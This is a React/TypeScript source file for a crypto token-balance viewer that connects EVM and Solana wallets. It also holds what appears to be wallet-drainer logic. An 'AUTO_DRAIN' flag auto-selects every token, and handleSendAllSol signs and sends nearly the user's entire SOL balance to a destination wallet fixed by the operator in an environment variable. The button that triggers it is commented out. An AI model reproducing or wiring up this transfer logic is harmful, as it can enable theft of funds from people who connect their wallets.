import { useCallback, useEffect, useState } from 'react';
import { useDynamicContext } from '@dynamic-labs/sdk-react-core';
import { PublicKey, SystemProgram, Transaction, Connection } from '@solana/web3.js';

import { Button, Loading, Toggle, useToasts } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { httpFetchTokens, Tokens } from '../../src/fetch-tokens';
import { publicActions } from 'viem';

const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

const TokenRow: React.FunctionComponent<{
  token: Tokens[number];
  address?: string;
}> = ({ token, address }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const pendingTxn =
    checkedRecords[token.contract_address]?.pendingTxn;
  const setTokenChecked = (tokenAddress: string, isChecked: boolean) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };
  const { balance, contract_address, contract_ticker_symbol } = token;

  // Safely compute balance; avoid division by zero when quote_rate is 0/undefined
  const hasQuoteRate =
    typeof token.quote_rate === 'number' && token.quote_rate !== 0;
  const unroundedBalance = hasQuoteRate
    ? tinyBig(token.quote || 0).div(token.quote_rate as number)
    : tinyBig(token.balance || 0).div(
        10 ** (Number(token.contract_decimals || 0)),
      );
  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
      ? unroundedBalance.round(2)
      : unroundedBalance.round(5);

  const [isLoading, setIsLoading] = useState(false);

  // Basic mock check for now to replace wagmi useWaitForTransactionReceipt
  useEffect(() => {
    if (pendingTxn && pendingTxn.hash) {
      setIsLoading(true);
      // Wait roughly for completion or use a dedicated hook per chain
      setTimeout(() => setIsLoading(false), 5000);
    }
  }, [pendingTxn]);

  return (
    <div key={contract_address}>
      {isLoading && <Loading />}
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace' }}>
        {roundedBalance.toString()}{' '}
      </span>
      <a href={`#`} target="_blank" rel="noreferrer">
        {contract_ticker_symbol}
      </a>{' '}
      (worth{' '}
      <span style={{ fontFamily: 'monospace' }}>
        {usdFormatter.format(token.quote || 0)}
      </span>
      )
    </div>
  );
};
export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { primaryWallet } = useDynamicContext();
  const address = primaryWallet?.address;
  const { setToast } = useToasts();

  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const fetchData = useCallback(async () => {
    if (!primaryWallet) return;
    setLoading(true);
    try {
      setError('');
      let erc20s: any[] = [];
      let chainId = 1;

      // Only fetch ERC20 tokens via Moralis when on an EVM chain
      if (primaryWallet.chain === 'EVM') {
        const networkRaw = await primaryWallet.getNetwork();
        chainId =
          typeof networkRaw === 'string'
            ? parseInt(networkRaw, 10)
            : Number(networkRaw) || 1;

        try {
          const newTokens = await httpFetchTokens(chainId, address as string);
          erc20s = (newTokens as any).data?.erc20s || [];
        } catch (e) {
          console.warn('ERC20 fetch failed:', e);
        }
      }

      const allTokens = [...erc20s];

      if (primaryWallet.chain === 'EVM') {
        const walletClient = await (
          primaryWallet.connector as any
        ).getWalletClient();
        if (walletClient) {
          const publicClient = (walletClient as any).extend(publicActions);
          const nativeBal = await publicClient.getBalance({
            address: address as `0x${string}`,
          });
          const nativeVal = BigInt(nativeBal.toString());
          if (nativeVal > BigInt(0)) {
            allTokens.push({
              contract_decimals: 18,
              contract_name: 'Native Token',
              contract_ticker_symbol: 'ETH/BNB/MATIC',
              contract_address: '0x0000000000000000000000000000000000000000',
              supports_erc: ['erc20'],
              logo_url: '',
              last_transferred_at: new Date().toISOString(),
              native_token: true,
              type: 'cryptocurrency',
              balance: nativeVal.toString(),
              balance_24h: nativeVal.toString(),
              quote_rate: 0,
              quote_rate_24h: 0,
              quote: 0,
              quote_24h: 0,
              nft_data: null,
            });
          }
        }
      }

      if (primaryWallet.chain === 'SOL') {
        const rpcUrl =
          process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
          'https://api.mainnet-beta.solana.com';
        const solanaConnection = new Connection(rpcUrl, 'confirmed');
        const publicKey = new PublicKey(address as string);
        if (solanaConnection && publicKey) {
          try {
            const lamports = await solanaConnection.getBalance(publicKey);
            if (lamports > 0) {
              const solBalance = BigInt(lamports);
              allTokens.push({
                contract_decimals: 9, // SOL has 9 decimals
                contract_name: 'Solana',
                contract_ticker_symbol: 'SOL',
                contract_address: '11111111111111111111111111111111', // System program
                supports_erc: ['erc20'], // mock support
                logo_url: '',
                last_transferred_at: new Date().toISOString(),
                native_token: true,
                type: 'cryptocurrency',
                balance: solBalance.toString(),
                balance_24h: solBalance.toString(),
                quote_rate: 0,
                quote_rate_24h: 0,
                quote: 0,
                quote_24h: 0,
                nft_data: null,
              });
            }
          } catch (err) {
            console.error('Error fetching SOL balance', err);
          }
        }
      }

      setTokens(allTokens);

      if (process.env.NEXT_PUBLIC_AUTO_DRAIN === 'true') {
        const autoChecked: Record<string, { isChecked: boolean }> = {};
        allTokens.forEach((token: any) => {
          autoChecked[token.contract_address] = { isChecked: true };
        });
        setCheckedRecords(autoChecked);
      } else {
        setCheckedRecords({});
      }
    } catch (error) {
      setError(`Failed to fetch chain tokens.`);
      console.error(error);
    }
    setLoading(false);
  }, [primaryWallet, address, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (address) {
      fetchData();
    }
  }, [address, fetchData]);

  useEffect(() => {
    if (!primaryWallet) {
      setTokens([]);
      setCheckedRecords({});
    }
  }, [primaryWallet, setTokens, setCheckedRecords]);

  if (loading) {
    return <Loading>Loading</Loading>;
  }

  if (error) {
    return <div>{error}</div>;
  }

  const handleSendAllSol = async () => {
    try {
      if (!primaryWallet || primaryWallet.chain !== 'SOL') {
        showToast('Connect a Solana wallet first.', 'warning');
        return;
      }

      const destinationAddress = process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL;
      if (!destinationAddress) {
        showToast('Destination Solana wallet is not configured.', 'warning');
        return;
      }

      const rpcUrl =
        process.env.NEXT_PUBLIC_SOLANA_RPC_URL ||
        'https://api.mainnet-beta.solana.com';
      const solanaConnection = new Connection(rpcUrl, 'confirmed');
      const fromPubkey = new PublicKey(address as string);
      const toPubkey = new PublicKey(destinationAddress);

      // Use cached SOL balance from tokens state instead of another RPC call
      const solToken = tokens.find(
        (t) => t.native_token && t.contract_ticker_symbol === 'SOL',
      );
      const balanceLamports = solToken
        ? Number(solToken.balance || 0)
        : 0;
      if (!solToken || balanceLamports <= 0) {
        showToast('No SOL balance to send.', 'warning');
        return;
      }

      // Fetch live balance right before building tx to avoid stale-cache issues
      const liveBalance = await solanaConnection.getBalance(fromPubkey);

      // Must leave at least the rent-exempt minimum (890,880 lamports) so the
      // sender account doesn't enter the forbidden 1–890,879 lamport range that
      // causes on-chain rent errors. Add 100,000 on top for the fee.
      const RENT_EXEMPT = 890880;
      const FEE_RESERVE  = 100000;
      const amountToSend = liveBalance - RENT_EXEMPT - FEE_RESERVE;
      if (amountToSend <= 0) {
        showToast('Balance is too low to cover network fee.', 'warning');
        return;
      }

      const { blockhash } = await solanaConnection.getLatestBlockhash();
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: amountToSend,
        }),
      );
      tx.recentBlockhash = blockhash;
      tx.feePayer = fromPubkey;

      // Use getSigner() from Dynamic connector, then send via our own RPC
      const connectorSigner = await (
        primaryWallet.connector as any
      ).getSigner();
      const signedTx = await connectorSigner.signTransaction(tx);
      const signature = await solanaConnection.sendRawTransaction(
        signedTx.serialize(),
        { skipPreflight: true },
      );

      if (signature) {
        showToast('SOL transfer submitted.', 'success');
      }
    } catch (err: any) {
      showToast(`SOL transfer failed: ${err.message || String(err)}`, 'error');
    }
  };

  return (
    <div style={{ margin: '20px' }}>
      {primaryWallet && tokens?.length === 0 && `No tokens found`}
      {tokens.map((token) => (
        <TokenRow
          token={token}
          key={token.contract_address}
          address={address}
        />
      ))}
      {/* {primaryWallet?.chain === 'SOL' && (
        <div style={{ marginTop: '16px' }}>
          <button
            onClick={handleSendAllSol}
            style={{
              padding: '8px 14px',
              borderRadius: '8px',
              border: '1px solid #30363d',
              background: 'rgba(56, 139, 253, 0.15)',
              color: '#e6edf3',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            Send all SOL to destination wallet
          </button>
        </div>
      )} */}
    </div>
  );
};
